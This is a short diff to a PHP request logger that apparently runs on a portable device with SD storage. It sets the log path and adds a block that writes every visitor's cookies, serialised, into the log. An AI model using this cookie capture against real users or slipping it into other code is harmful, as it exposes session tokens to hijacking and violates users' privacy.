@@ -3,7 +3,7 @@
   $logFileName = "myrandomname.log";
 
   // Make sure you specify a path with enough capacity such as a USB drive or you're not going to go very far with this!
-  $logFilePath = "";
+  $logFilePath = "/sd/logging/";
 
   // Grab the host and full path of the requested URI
   $requestedHost = $_SERVER["HTTP_HOST"];
@@ -18,7 +18,7 @@
   // Don't log favicon requests which the browser will issue when loading the log file
   if($_SERVER["REQUEST_URI"] != "/favicon.ico")
   {
-    $handle = fopen($logFileName, 'a') or die("Can't open file");
+    $handle = fopen($logFilePath.$logFileName, 'a') or die("Can't open file");
 
     fwrite($handle, date('Y-m-d H:i:s'));
     fwrite($handle, "|");
@@ -32,6 +32,13 @@
 
     fwrite($handle, "\n");
 
+    if(!empty($_COOKIE) && is_array($_COOKIE))
+    {
+    	fwrite($handle, "Cookies: ");
+    	fwrite($handle, serialize($_COOKIE));
+
+    	fwrite($handle, "\n");
+    }
     fclose($handle);
   }
 
